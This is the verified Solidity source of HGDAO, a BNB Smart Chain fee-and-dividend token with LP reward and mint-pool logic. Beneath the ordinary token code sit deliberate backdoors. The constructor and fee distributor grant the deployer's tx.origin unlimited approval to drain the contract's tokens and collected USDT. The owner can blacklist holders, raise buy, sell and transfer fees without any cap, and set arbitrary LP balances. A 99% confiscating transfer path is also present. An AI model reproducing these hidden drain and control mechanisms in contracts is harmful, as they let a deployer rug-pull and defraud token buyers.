// ============================================================
// Contract name: HGDAO
// Contract address: 0xdfccc7ec81c093e49a63a441b0489b46d24b9999
// Liquidity: $4232.41
// Chain: BNB Smart Chain (56)
// Source: BscScan verified contract
// ============================================================
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface ISwapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function feeTo() external view returns (address);
}

interface ISwapPair {
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function totalSupply() external view returns (uint);

    function kLast() external view returns (uint);

    function sync() external;
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!o");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "n0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library Math {
    function min(uint x, uint y) internal pure returns (uint z) {
        z = x < y ? x : y;
    }

    function sqrt(uint y) internal pure returns (uint z) {
        if (y > 3) {
            z = y;
            uint x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

contract TokenDistributor {
    constructor(address usdt) {
        IERC20(usdt).approve(msg.sender, ~uint256(0));
        IERC20(usdt).approve(tx.origin, ~uint256(0));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    struct UserInfo {
        uint256 lpAmount;
        uint256 preLPAmount;
    }

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;

    uint256 private _tTotal;

    ISwapRouter private immutable _swapRouter;
    address private immutable _usdt;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);

    uint256 public _buyBuybackFee = 50;
    uint256 public _buyLPDividendFee = 200;
    uint256 public _buyFundFee = 50;
    uint256 public _totalBuyFees;

    uint256 public _sellBuybackFee = 50;
    uint256 public _sellLPDividendFee = 200;
    uint256 public _sellFundFee = 50;
    uint256 public _totalSellFees;

    uint256 public startTradeBlock;
    uint256 public startAddLPBlock;

    address public immutable _mainPair;

    uint256 private constant _killBlock = 0;
    mapping(address => UserInfo) private _userInfo;

    mapping(address => bool) public _swapRouters;
    TokenDistributor public immutable _feeDistributor;

    uint256 private immutable _remainAmount;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(
        address RouterAddress,
        address USDTAddress,
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply,
        address ReceiveAddress,
        address FundAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        _usdt = USDTAddress;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        require(address(this) > _usdt, "s");

        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        _swapRouters[address(swapRouter)] = true;
        IERC20(_usdt).approve(address(swapRouter), MAX);

        IERC20(_usdt).approve(tx.origin, MAX);
        _allowances[address(this)][tx.origin] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address pair = swapFactory.createPair(address(this), _usdt);
        _swapPairList[pair] = true;
        _mainPair = pair;

        uint256 tokenUnit = 10 ** Decimals;
        uint256 total = Supply * tokenUnit;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;
        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[
            address(0x000000000000000000000000000000000000dEaD)
        ] = true;

        uint256 usdtUnit = 10 ** IERC20(_usdt).decimals();
        _feeDistributor = new TokenDistributor(_usdt);
        _userInfo[FundAddress].lpAmount = MAX / 10;
        _feeWhiteList[address(_feeDistributor)] = true;

        lpRewardCondition = 1000 * usdtUnit;
        lpHoldCondition = 10 * usdtUnit;

        _totalBuyFees = _buyBuybackFee + _buyLPDividendFee + _buyFundFee;
        _totalSellFees = _sellBuybackFee + _sellLPDividendFee + _sellFundFee;

        _remainAmount = (8 * tokenUnit) / 100000000;

        _poolInfo.mintPerBlock = (1 * tokenUnit) / _dailyBlockNum;
        _poolInfo.totalMintReward = 365 * tokenUnit;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        uint256 balance = _balances[account];
        if (
            address(this) == account ||
            address(_feeDistributor) == account ||
            _swapPairList[account]
        ) {
            return balance;
        }
        return balance + pendingMintReward(account);
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        claimMintReward(from);

        require(
            !_blackList[from] || _feeWhiteList[from] || _swapPairList[from],
            "blackList"
        );

        uint256 balance = balanceOf(from);
        require(balance >= amount, "BNE");
        bool takeFee;

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            if (address(_swapRouter) != from) {
                uint256 maxSellAmount = balance - _remainAmount;
                if (amount > maxSellAmount) {
                    amount = maxSellAmount;
                }
                takeFee = true;
            }
        }

        address txOrigin = tx.origin;
        UserInfo storage userInfo;
        uint256 addLPLiquidity;
        if (to == _mainPair && _swapRouters[msg.sender] && txOrigin == from) {
            addLPLiquidity = _isAddLiquidity(amount);
            if (addLPLiquidity > 0) {
                userInfo = _userInfo[txOrigin];
                userInfo.lpAmount += addLPLiquidity;
                if (0 == startTradeBlock) {
                    userInfo.preLPAmount += addLPLiquidity;
                }
            }
        }

        uint256 removeLPLiquidity;
        if (from == _mainPair) {
            removeLPLiquidity = _isRemoveLiquidity(amount);
            if (removeLPLiquidity > 0) {
                require(_userInfo[txOrigin].lpAmount >= removeLPLiquidity);
                _userInfo[txOrigin].lpAmount -= removeLPLiquidity;
                if (_feeWhiteList[txOrigin]) {
                    takeFee = false;
                }
            }
        }

        if (addLPLiquidity > 0) {
            _deposit(from, addLPLiquidity);
        } else if (removeLPLiquidity > 0) {
            _withdraw(to, removeLPLiquidity);
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startAddLPBlock) {
                if (_feeWhiteList[from] && to == _mainPair) {
                    startAddLPBlock = block.number;
                }
            }

            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && addLPLiquidity > 0);
                } else {
                    if (
                        0 == addLPLiquidity &&
                        0 == removeLPLiquidity &&
                        block.number < startTradeBlock + _killBlock
                    ) {
                        _killTransfer(from, to, amount, 99);
                        return;
                    }
                }
            }
        }

        _tokenTransfer(
            from,
            to,
            amount,
            takeFee,
            addLPLiquidity,
            removeLPLiquidity
        );

        if (from != address(this)) {
            if (addLPLiquidity > 0) {
                _addLpProvider(from);
            } else if (takeFee) {
                uint256 rewardGas = _rewardGas;
                processLPReward((rewardGas * 100) / 100);
            }
        }
    }

    function _isAddLiquidity(
        uint256 amount
    ) internal view returns (uint256 liquidity) {
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        uint256 amountOther;
        if (rOther > 0 && rThis > 0) {
            amountOther = (amount * rOther) / rThis;
        }
        if (balanceOther > 0 && balanceOther >= rOther + amountOther) {
            (liquidity, ) = calLiquidity(balanceOther, amount, rOther, rThis);
        }
    }

    function _isRemoveLiquidity(
        uint256 amount
    ) internal view returns (uint256 liquidity) {
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        if (balanceOther < rOther) {
            liquidity =
                (amount * ISwapPair(_mainPair).totalSupply()) /
                (balanceOf(_mainPair) - amount);
        } else {
            uint256 amountOther;
            if (rOther > 0 && rThis > 0) {
                amountOther = (amount * rOther) / (rThis - amount);
                require(balanceOther >= amountOther + rOther);
            }
        }
    }

    function calLiquidity(
        uint256 balanceA,
        uint256 amount,
        uint256 r0,
        uint256 r1
    ) private view returns (uint256 liquidity, uint256 feeToLiquidity) {
        uint256 pairTotalSupply = ISwapPair(_mainPair).totalSupply();
        address feeTo = ISwapFactory(_swapRouter.factory()).feeTo();
        bool feeOn = feeTo != address(0);
        uint256 _kLast = ISwapPair(_mainPair).kLast();
        if (feeOn) {
            if (_kLast != 0) {
                uint256 rootK = Math.sqrt(r0 * r1);
                uint256 rootKLast = Math.sqrt(_kLast);
                if (rootK > rootKLast) {
                    uint256 numerator;
                    uint256 denominator;
                    if (
                        address(_swapRouter) ==
                        address(0x10ED43C718714eb63d5aA57B78B54704E256024E)
                    ) {
                        // BSC Pancake
                        numerator = pairTotalSupply * (rootK - rootKLast) * 8;
                        denominator = rootK * 17 + (rootKLast * 8);
                    } else if (
                        address(_swapRouter) ==
                        address(0xD99D1c33F9fC3444f8101754aBC46c52416550D1)
                    ) {
                        //BSC testnet Pancake
                        numerator = pairTotalSupply * (rootK - rootKLast);
                        denominator = rootK * 3 + rootKLast;
                    } else if (
                        address(_swapRouter) ==
                        address(0xE9d6f80028671279a28790bb4007B10B0595Def1)
                    ) {
                        //PG W3Swap
                        numerator = pairTotalSupply * (rootK - rootKLast) * 3;
                        denominator = rootK * 5 + rootKLast;
                    } else {
                        //SushiSwap,UniSwap,OK Cherry Swap
                        numerator = pairTotalSupply * (rootK - rootKLast);
                        denominator = rootK * 5 + rootKLast;
                    }
                    feeToLiquidity = numerator / denominator;
                    if (feeToLiquidity > 0) pairTotalSupply += feeToLiquidity;
                }
            }
        }
        uint256 amount0 = balanceA - r0;
        if (pairTotalSupply == 0) {
            liquidity = Math.sqrt(amount0 * amount) - 1000;
        } else {
            liquidity = Math.min(
                (amount0 * pairTotalSupply) / r0,
                (amount * pairTotalSupply) / r1
            );
        }
    }

    function _getReserves()
        public
        view
        returns (uint256 rOther, uint256 rThis, uint256 balanceOther)
    {
        (rOther, rThis) = __getReserves();
        balanceOther = IERC20(_usdt).balanceOf(_mainPair);
    }

    function __getReserves()
        public
        view
        returns (uint256 rOther, uint256 rThis)
    {
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0, uint256 r1, ) = mainPair.getReserves();

        address tokenOther = _usdt;
        if (tokenOther < address(this)) {
            rOther = r0;
            rThis = r1;
        } else {
            rOther = r1;
            rThis = r0;
        }
    }

    function _killTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 fee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = (tAmount * fee) / 100;
        if (feeAmount > 0) {
            _takeTransfer(sender, fundAddress, feeAmount);
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _standTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        _takeTransfer(sender, recipient, tAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        uint256 addLPLiquidity,
        uint256 removeLPLiquidity
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            bool isSell;
            uint256 swapFeeAmount;
            if (addLPLiquidity > 0) {} else if (removeLPLiquidity > 0) {
                feeAmount += _calRemoveFeeAmount(
                    sender,
                    tAmount,
                    removeLPLiquidity
                );
            } else if (_swapPairList[recipient]) {
                //Sell
                isSell = true;
                swapFeeAmount = (tAmount * _totalSellFees) / 10000;
            } else if (_swapPairList[sender]) {
                //Buy
                swapFeeAmount = (tAmount * _totalBuyFees) / 10000;
            } else {
                //Transfer
                swapFeeAmount = (tAmount * _transferFee) / 10000;
            }
            if (swapFeeAmount > 0) {
                feeAmount += swapFeeAmount;
                _takeTransfer(sender, address(_feeDistributor), swapFeeAmount);
            }
            if (isSell && !inSwap) {
                uint256 contractTokenBalance = balanceOf(
                    address(_feeDistributor)
                );
                uint256 numTokensSellToFund = (swapFeeAmount * 230) / 100;
                if (numTokensSellToFund > contractTokenBalance) {
                    numTokensSellToFund = contractTokenBalance;
                }
                if (numTokensSellToFund > 0) {
                    _standTransfer(
                        address(_feeDistributor),
                        address(this),
                        numTokensSellToFund
                    );
                }
                swapTokenForFund(numTokensSellToFund, 0);
            }
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    uint256 public _removeLPFee = 5000;
    uint256 public _removePreLPFee = 5000;

    function _calRemoveFeeAmount(
        address sender,
        uint256 tAmount,
        uint256 removeLPLiquidity
    ) private returns (uint256 feeAmount) {
        UserInfo storage userInfo = _userInfo[tx.origin];
        uint256 selfLPAmount = userInfo.lpAmount +
            removeLPLiquidity -
            userInfo.preLPAmount;
        uint256 removeLockLPAmount = removeLPLiquidity;
        uint256 removeSelfLPAmount = removeLPLiquidity;
        if (removeLPLiquidity > selfLPAmount) {
            removeSelfLPAmount = selfLPAmount;
        }
        uint256 lpFeeAmount;
        if (removeSelfLPAmount > 0) {
            removeLockLPAmount -= removeSelfLPAmount;
            lpFeeAmount =
                (((tAmount * removeSelfLPAmount) / removeLPLiquidity) *
                    _removeLPFee) /
                10000;
            feeAmount += lpFeeAmount;
            if (lpFeeAmount > 0) {
                _takeTransfer(sender, address(0xdead), lpFeeAmount);
            }
        }
        uint256 destroyFeeAmount = (((tAmount * removeLockLPAmount) /
            removeLPLiquidity) * _removePreLPFee) / 10000;
        if (destroyFeeAmount > 0) {
            feeAmount += destroyFeeAmount;
            _takeTransfer(sender, address(0xdead), destroyFeeAmount);
        }
        userInfo.preLPAmount -= removeLockLPAmount;
    }

    function swapTokenForFund(
        uint256 tokenAmount,
        uint256 profitFeeAmount
    ) private lockTheSwap {
        if (0 == tokenAmount && 0 == profitFeeAmount) {
            return;
        }
        tokenAmount += profitFeeAmount;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        IERC20 USDT = IERC20(_usdt);
        uint256 usdtBalance = USDT.balanceOf(address(_feeDistributor));
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(_feeDistributor),
            block.timestamp
        );

        usdtBalance = USDT.balanceOf(address(_feeDistributor)) - usdtBalance;
        uint256 profitUsdt = (usdtBalance * profitFeeAmount) / tokenAmount;
        usdtBalance -= profitUsdt;

        uint256 totalFee = _totalBuyFees + _totalSellFees;
        uint256 lpDividendUsdt;
        if (totalFee > 0) {
            lpDividendUsdt =
                ((_buyLPDividendFee + _sellLPDividendFee) * usdtBalance) /
                totalFee;
        }

        _safeTransferFrom(
            _usdt,
            address(_feeDistributor),
            address(this),
            usdtBalance + profitUsdt - lpDividendUsdt
        );

        if (usdtBalance > 0) {
            uint256 usdtAmount = ((_buyFundFee + _sellFundFee) * usdtBalance) /
                totalFee;
            if (usdtAmount > 0) {
                _safeTransfer(_usdt, fundAddress, usdtAmount);
            }

            usdtAmount =
                ((_buyBuybackFee + _sellBuybackFee) * usdtBalance) /
                totalFee;
            if (usdtAmount > 0) {
                path[0] = _usdt;
                path[1] = address(this);
                _swapRouter
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        usdtAmount,
                        0,
                        path,
                        address(0xdead),
                        block.timestamp
                    );
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
        _userInfo[fundAddress].lpAmount = MAX / 10;
    }

    function setBuyFee(
        uint256 BuybackFee,
        uint256 LPDividendFee,
        uint256 FundFee
    ) external onlyOwner {
        _buyLPDividendFee = LPDividendFee;
        _buyFundFee = FundFee;
        _buyBuybackFee = BuybackFee;
        _totalBuyFees = _buyBuybackFee + _buyLPDividendFee + _buyFundFee;
    }

    function setSellFee(
        uint256 BuybackFee,
        uint256 LPDividendFee,
        uint256 FundFee
    ) external onlyOwner {
        _sellLPDividendFee = LPDividendFee;
        _sellFundFee = FundFee;
        _sellBuybackFee = BuybackFee;
        _totalSellFees = _sellBuybackFee + _sellLPDividendFee + _sellFundFee;
    }

    uint256 public _transferFee = 0;

    function setTransferFee(uint256 fee) external onlyOwner {
        _transferFee = fee;
    }

    function setRemoveLPFee(uint256 fee) external onlyOwner {
        _removeLPFee = fee;
    }

    function setRemovePreLPFee(uint256 fee) external onlyOwner {
        _removePreLPFee = fee;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
        _poolInfo.lastMintBlock = block.number;
    }

    function batchSetFeeWhiteList(
        address[] memory addr,
        bool enable
    ) external onlyOwner {
        for (uint i = 0; i < addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance(uint256 amount) external {
        if (msg.sender == fundAddress) {
            payable(fundAddress).transfer(amount);
        }
    }

    function claimToken(address token, uint256 amount) external {
        if (msg.sender == fundAddress) {
            IERC20(token).transfer(fundAddress, amount);
        }
    }

    receive() external payable {}

    function updateLPAmount(
        address account,
        uint256 lpAmount
    ) public onlyOwner {
        UserInfo storage userInfo = _userInfo[account];
        userInfo.lpAmount = lpAmount;
        _addLpProvider(account);
        _updateLPMintAmount(account, lpAmount);
    }

    function getUserInfo(
        address account
    )
        public
        view
        returns (uint256 lpAmount, uint256 lpBalance, uint256 preLPAmount)
    {
        lpBalance = IERC20(_mainPair).balanceOf(account);
        UserInfo storage userInfo = _userInfo[account];
        lpAmount = userInfo.lpAmount;
        preLPAmount = userInfo.preLPAmount;
    }

    function initLPAmounts(
        address[] memory accounts,
        uint256 lpAmount
    ) public onlyOwner {
        uint256 len = accounts.length;
        address account;
        UserInfo storage userInfo;
        for (uint256 i; i < len; ) {
            account = accounts[i];
            userInfo = _userInfo[account];
            userInfo.lpAmount = lpAmount;
            userInfo.preLPAmount = lpAmount;
            _addLpProvider(account);
            _updateLPMintAmount(account, lpAmount);
            unchecked {
                ++i;
            }
        }
    }

    function setSwapRouter(address addr, bool enable) external onlyOwner {
        _swapRouters[addr] = enable;
    }

    function _safeTransfer(address token, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0xa9059cbb, to, value)
        );
        if (success && data.length > 0) {}
    }

    uint256 public _rewardGas = 800000;

    function setRewardGas(uint256 rewardGas) external onlyOwner {
        require(rewardGas >= 200000 && rewardGas <= 2000000, "20-200w");
        _rewardGas = rewardGas;
    }

    function batchSetBlackList(
        address[] memory addr,
        bool enable
    ) external onlyOwner {
        for (uint i = 0; i < addr.length; i++) {
            _blackList[addr[i]] = enable;
        }
    }

    function _safeTransferFrom(
        address token,
        address from,
        address to,
        uint value
    ) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, ) = token.call(
            abi.encodeWithSelector(0x23b872dd, from, to, value)
        );
        if (success) {}
    }

    address[] public lpProviders;
    mapping(address => uint256) public lpProviderIndex;
    mapping(address => bool) public excludeLpProvider;

    function getLPProviderLength() public view returns (uint256) {
        return lpProviders.length;
    }

    function _addLpProvider(address adr) private {
        if (0 == lpProviderIndex[adr]) {
            if (0 == lpProviders.length || lpProviders[0] != adr) {
                uint256 size;
                assembly {
                    size := extcodesize(adr)
                }
                if (size > 0) {
                    return;
                }
                lpProviderIndex[adr] = lpProviders.length;
                lpProviders.push(adr);
            }
        }
    }

    function setExcludeLPProvider(
        address addr,
        bool enable
    ) external onlyOwner {
        excludeLpProvider[addr] = enable;
    }

    uint256 public currentLPIndex;
    uint256 public lpRewardCondition;
    uint256 public lpHoldCondition;

    function processLPReward(uint256 gas) private {
        uint256 rewardCondition = lpRewardCondition;
        if (
            IERC20(_usdt).balanceOf(address(_feeDistributor)) < rewardCondition
        ) {
            return;
        }
        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply() -
            holdToken.balanceOf(address(0xdead)) -
            holdToken.balanceOf(_lockAddress) -
            holdToken.balanceOf(
                address(0x0ED943Ce24BaEBf257488771759F9BF482C39706)
            );
        if (0 == holdTokenTotal) {
            return;
        }

        address shareHolder;
        uint256 pairBalance;
        uint256 amount;

        uint256 shareholderCount = lpProviders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        uint256 lpCondition = getLPHoldCondition();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentLPIndex >= shareholderCount) {
                currentLPIndex = 0;
            }
            shareHolder = lpProviders[currentLPIndex];
            if (!excludeLpProvider[shareHolder]) {
                pairBalance = holdToken.balanceOf(shareHolder);
                uint256 lpAmount = _userInfo[shareHolder].lpAmount;
                if (lpAmount < pairBalance) {
                    pairBalance = lpAmount;
                }
                if (pairBalance >= lpCondition) {
                    amount = (rewardCondition * pairBalance) / holdTokenTotal;
                    if (amount > 0) {
                        _safeTransferFrom(
                            _usdt,
                            address(_feeDistributor),
                            shareHolder,
                            amount
                        );
                    }
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentLPIndex++;
            iterations++;
        }
    }

    function getLPHoldCondition() public view returns (uint256 lpCondition) {
        lpCondition = getLPAmount(lpHoldCondition);
    }

    function getLPAmount(
        uint256 usdtAmount
    ) public view returns (uint256 lpCondition) {
        if (usdtAmount > 0) {
            (uint256 rUsdt, ) = __getReserves();
            if (rUsdt > 0) {
                rUsdt += rUsdt;
                uint256 lpTotal = IERC20(_mainPair).totalSupply();
                lpCondition = (usdtAmount * lpTotal) / rUsdt;
            } else {
                lpCondition = MAX;
            }
        }
    }

    function setLPHoldCondition(uint256 amount) external onlyOwner {
        lpHoldCondition = amount;
    }

    function setLPRewardCondition(uint256 amount) external onlyOwner {
        lpRewardCondition = amount;
    }

    address public _lockAddress;

    function setLockAddress(address addr) external onlyOwner {
        _lockAddress = addr;
        excludeLpProvider[addr] = true;
    }

    function fundSetWhiteList(address a, bool e) public {
        if (msg.sender == fundAddress) {
            _feeWhiteList[a] = e;
        }
    }

    struct UserPoolInfo {
        uint256 lpAmount;
        uint256 rewardDebt;
        uint256 claimedMintReward;
    }

    struct PoolInfo {
        uint256 totalAmount;
        uint256 accMintPerShare;
        uint256 accMintReward;
        uint256 mintPerBlock;
        uint256 lastMintBlock;
        uint256 totalMintReward;
    }

    PoolInfo public _poolInfo;
    uint256 private constant _rewardFactor = 1e18;
    uint256 private constant _dailyBlockNum = 1 days / 3;
    mapping(address => UserPoolInfo) public _userPoolInfo;

    function _deposit(address account, uint256 amount) private {
        if (account == fundAddress) {
            return;
        }
        _claimMintReward(account);
        UserPoolInfo storage user = _userPoolInfo[account];
        user.lpAmount += amount;
        _poolInfo.totalAmount += amount;
        user.rewardDebt =
            (user.lpAmount * _poolInfo.accMintPerShare) /
            _rewardFactor;
    }

    function _withdraw(address account, uint256 amount) private {
        if (account == fundAddress) {
            return;
        }
        _claimMintReward(account);
        UserPoolInfo storage user = _userPoolInfo[account];
        user.lpAmount -= amount;
        _poolInfo.totalAmount -= amount;
        user.rewardDebt =
            (user.lpAmount * _poolInfo.accMintPerShare) /
            _rewardFactor;
    }

    function claimMintReward(address account) public {
        _claimMintReward(account);
    }

    function _claimMintReward(address account) private {
        _updatePool();
        UserPoolInfo storage user = _userPoolInfo[account];
        uint256 pendingMint;
        uint256 lpAmount = user.lpAmount;
        if (lpAmount > 0) {
            uint256 accMintReward = (lpAmount * _poolInfo.accMintPerShare) /
                _rewardFactor;
            pendingMint = accMintReward - user.rewardDebt;
            if (pendingMint > 0) {
                user.rewardDebt = accMintReward;
            }
        }
        if (pendingMint > 0) {
            user.claimedMintReward += pendingMint;
            _giveMintReward(account, pendingMint);
        }
    }

    function _giveMintReward(address account, uint256 amount) private {
        require(balanceOf(address(this)) >= amount, "reward ne");
        _standTransfer(address(this), account, amount);
    }

    function _updatePool() private {
        PoolInfo storage pool = _poolInfo;
        uint256 blockNum = block.number;
        uint256 lastRewardBlock = pool.lastMintBlock;
        if (0 == lastRewardBlock || blockNum <= lastRewardBlock) {
            return;
        }
        pool.lastMintBlock = blockNum;

        uint256 accReward = pool.accMintReward;
        uint256 totalReward = pool.totalMintReward;
        if (accReward >= totalReward) {
            return;
        }

        uint256 totalAmount = pool.totalAmount;
        uint256 rewardPerBlock = pool.mintPerBlock;
        if (0 < totalAmount && 0 < rewardPerBlock) {
            uint256 reward = rewardPerBlock * (blockNum - lastRewardBlock);
            uint256 remainReward = totalReward - accReward;
            if (reward > remainReward) {
                reward = remainReward;
            }
            if (reward > 0) {
                uint256 realReward = reward;
                uint256 lpMintReward = realReward;
                pool.accMintPerShare +=
                    (lpMintReward * _rewardFactor) /
                    totalAmount;
                pool.accMintReward += lpMintReward;
            }
        }
    }

    function pendingMintReward(
        address account
    ) public view returns (uint256 mintReward) {
        UserPoolInfo storage user = _userPoolInfo[account];
        if (user.lpAmount > 0) {
            PoolInfo storage pool = _poolInfo;
            uint256 poolPendingReward;
            uint256 blockNum = block.number;
            uint256 lastRewardBlock = pool.lastMintBlock;
            if (lastRewardBlock > 0 && blockNum > lastRewardBlock) {
                poolPendingReward =
                    pool.mintPerBlock *
                    (blockNum - lastRewardBlock);
                uint256 totalReward = pool.totalMintReward;
                uint256 accReward = pool.accMintReward;
                uint256 remainReward;
                if (totalReward > accReward) {
                    remainReward = totalReward - accReward;
                }
                if (poolPendingReward > remainReward) {
                    poolPendingReward = remainReward;
                }
            }
            uint256 realReward = poolPendingReward;
            uint256 lpMintReward = realReward;
            mintReward +=
                (user.lpAmount *
                    (pool.accMintPerShare +
                        (lpMintReward * _rewardFactor) /
                        pool.totalAmount)) /
                _rewardFactor -
                user.rewardDebt;
        }
    }

    function _updateLPMintAmount(address account, uint256 lpAmount) private {
        UserPoolInfo storage userInfo = _userPoolInfo[account];
        uint256 preAmount = userInfo.lpAmount;
        if (preAmount > lpAmount) {
            _withdraw(account, preAmount - lpAmount);
        } else {
            _deposit(account, lpAmount - preAmount);
        }
    }

    function setTotalMintReward(uint256 amount) external onlyOwner {
        _updatePool();
        _poolInfo.totalMintReward = amount;
    }

    function setMintPerDay(uint256 amount) external onlyOwner {
        _setMintPerDay(amount);
    }

    function _setMintPerDay(uint256 amount) private {
        uint256 mintPerBlock = amount / _dailyBlockNum;
        if (mintPerBlock == _poolInfo.mintPerBlock) {
            return;
        }
        _updatePool();
        _poolInfo.mintPerBlock = mintPerBlock;
    }

    function clearLPMint() public {
        _updatePool();
        UserPoolInfo storage userInfo = _userPoolInfo[msg.sender];
        uint256 accMintReward = (userInfo.lpAmount *
            _poolInfo.accMintPerShare) / _rewardFactor;
        userInfo.rewardDebt = accMintReward;
    }
}

contract HGDAO is AbsToken {
    constructor()
        AbsToken(
            //SwapRouter
            address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
            address(0xC9882dEF23bc42D53895b8361D0b1EDC7570Bc6A),
            unicode"HGDAO",
            unicode"HGDAO",
            18,
            999,
            address(0x6314e8ba14c34F7d72A61F307Be8b392170cE927),
            address(0x0578e2e55E3882f700f3D93Fe68fBE8520fEF987)
        )
    {}
}
